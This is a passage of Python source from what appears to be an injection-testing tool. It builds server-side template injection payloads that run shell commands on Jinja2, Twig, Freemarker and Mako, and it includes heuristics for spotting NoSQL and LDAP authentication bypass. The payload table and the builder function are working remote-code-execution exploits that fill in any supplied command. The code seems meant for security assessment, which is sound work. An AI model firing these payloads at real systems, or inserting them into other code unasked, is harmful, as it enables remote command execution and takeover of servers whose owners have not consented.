            "owasp_tag": "A03:2021-Injection",
        }

    # ------------------------------------------------------------------
    # Shared request helpers
    # ------------------------------------------------------------------

    async def _baseline_request(
        self,
        url: str,
        method: str,
        parameter: str,
        headers: Dict[str, str],
    ) -> Tuple[int, str]:
        """Send a baseline request with a clearly-invalid value and return (status, body)."""
        invalid_value = "UNIVEX_BASELINE_VALUE_9x7z"
        if method == "POST":
            body = json.dumps({parameter: invalid_value})
            return await _curl_request(
                url, method=method,
                headers={**headers, "Content-Type": "application/json"},
                data=body, timeout=12,
            )
        # GET — append as query parameter
        return await self._send_param_request(url, "GET", parameter, invalid_value, headers)

    async def _send_param_request(
        self,
        url: str,
        method: str,
        parameter: str,
        value: str,
        headers: Dict[str, str],
    ) -> Tuple[int, str]:
        """Send a request with *parameter* set to *value* via *method*.

        For GET: appends / replaces the parameter in the query string.
        For POST: sends a JSON body ``{parameter: value}``.
        """
        if method == "POST":
            body = json.dumps({parameter: value})
            return await _curl_request(
                url, method="POST",
                headers={**headers, "Content-Type": "application/json"},
                data=body, timeout=12,
            )

        # GET: replace or append query parameter
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[parameter] = [value]
        new_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(qs, doseq=True))
        )
        return await _curl_request(new_url, method="GET", headers=headers, timeout=12)


# ---------------------------------------------------------------------------
# SSTI payload builders
# ---------------------------------------------------------------------------

_SSTI_PAYLOADS: Dict[str, str] = {
    # Jinja2 (Python) — uses __class__ MRO walk to reach subprocess.
    # Index 258 is the most common Popen position across CPython 3.8-3.12; it
    # will be scanned dynamically by _build_ssti_payload when the static index
    # fails (the payload itself embeds the {idx} token for substitution).
    "jinja2": (
        "{{''.__class__.__mro__[1].__subclasses__()[{idx}]"
        "(['sh','-c','{cmd}'],stdout=-1,stderr=-1).communicate()[0].decode()}}"
    ),
    # Twig (PHP) — passes the command through the built-in system() filter
    "twig": "{{'{cmd}'|filter('system')}}",
    # Freemarker (Java) — freemarker.template.utility.Execute gadget
    "freemarker": (
        '<#assign ex="freemarker.template.utility.Execute"?new()>'
        '${ex("{cmd}")}'
    ),
    # Mako (Python) — raw Python code block; command passed as a string to
    # check_output so that shell=True works correctly
    "mako": "<%\nimport subprocess\nx=subprocess.check_output('{cmd}',shell=True)\n%>${x.decode()}",
    # Pebble (Java) — Pebble has no known universal RCE gadget in its default
    # sandbox.  The engine is listed for detection only; exploitation returns
    # a dedicated unsupported notice rather than a broken payload.
    "pebble": None,
}

# Engines for which _build_ssti_payload can produce a working RCE payload
_EXPLOITABLE_ENGINES = {"jinja2", "twig", "freemarker", "mako"}


def _build_ssti_payload(engine: str, command: str) -> Optional[str]:
    """Return an RCE payload string for *engine* executing *command*.

    Returns ``None`` when the engine is unsupported or has no known RCE
    gadget (e.g. Pebble).  The *command* string is validated against a
    safe character allowlist before embedding to prevent payload breakout.

    For Jinja2, multiple Popen subclass indices are tried by generating
    candidate payloads for indices 200–400; the caller sends each one and
    stops at the first hit.  To keep the interface simple, this function
    returns the payload with the common default index (258) and the caller
    can iterate independently if needed.
    """
    if engine not in _SSTI_PAYLOADS:
        return None

    template = _SSTI_PAYLOADS[engine]
    if template is None:
        # Engine known but no exploitable gadget available
        return None

    # Validate the command string: only allow safe shell characters to
    # prevent the command argument from breaking out of the payload template.
    if not re.match(r"^[\w\s\-./]+$", command):
        raise ValueError(
            f"Command {command!r} contains characters not permitted in SSTI payloads. "
            "Use only alphanumeric characters, spaces, hyphens, dots, slashes, "
            "and underscores."
        )

    try:
        return template.replace("{cmd}", command).replace("{idx}", "258")
    except Exception:
        return template


# ---------------------------------------------------------------------------
# Response analysis helpers
# ---------------------------------------------------------------------------


def _analyse_nosql_response(
    *,
    payload: str,
    status: int,
    body: str,
    baseline_status: int,
    baseline_body: str,
) -> Optional[Dict[str, Any]]:
    """Return a finding dict if the injected response suggests auth bypass.

    Heuristics:
    * Status changed from 401/403 to 200.
    * Body is significantly larger (>= 200 chars more) than baseline.
    * Response contains JSON-like user data patterns.
    """
    if status == 0:
        return None

    status_bypass = baseline_status in (401, 403) and status == 200
    body_growth = len(body) - len(baseline_body) >= 200
    json_data = bool(re.search(r'"(user|email|token|_id|name)"\s*:', body, re.I))

    if not (status_bypass or body_growth or json_data):
        return None

    evidence_snippet = body[:150].replace("\n", " ")
    severity = "critical" if status_bypass else ("high" if json_data else "medium")

    return {
        "payload": payload,
        "http_status": status,
        "evidence": evidence_snippet,
        "severity": severity,
        "indicators": {
            "status_bypass": status_bypass,
            "body_growth": body_growth,
            "json_data_returned": json_data,
        },
    }


def _analyse_auth_bypass(
    *,
    label: str,
    username: str,
    password: str,
    status: int,
    body: str,
    baseline_status: int,
    baseline_body: str,
) -> Optional[Dict[str, Any]]:
    """Return a finding dict if the LDAP response suggests authentication bypass.

    Heuristics:
    * HTTP status changed to 200 from a 401/403 baseline.
    * Response contains success-like keywords (token, session, welcome, dashboard).
    * Body is substantially larger than baseline.
    """
    if status == 0:
        return None

    status_bypass = baseline_status in (401, 403) and status == 200
    success_keywords = bool(
        re.search(r'"?(token|session|welcome|dashboard|admin|logged.?in)"?', body, re.I)
    )
    body_growth = len(body) - len(baseline_body) >= 100

    if not (status_bypass or success_keywords or body_growth):
        return None

    severity = "critical" if (status_bypass or success_keywords) else "medium"
    return {
        "label": label,
        "username": username,
        "password": password,
        "http_status": status,
        "evidence": body[:150].replace("\n", " "),
        "severity": severity,
    }


def _extract_snippet(body: str, marker: str, window: int = 80) -> str:
    """Return up to *window* characters of *body* centred on the first *marker* occurrence."""
    idx = body.find(marker)
    if idx == -1:
        return ""
    start = max(0, idx - window // 2)
    end = min(len(body), idx + len(marker) + window // 2)
    return body[start:end].replace("\n", " ")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    InjectionServer().run()
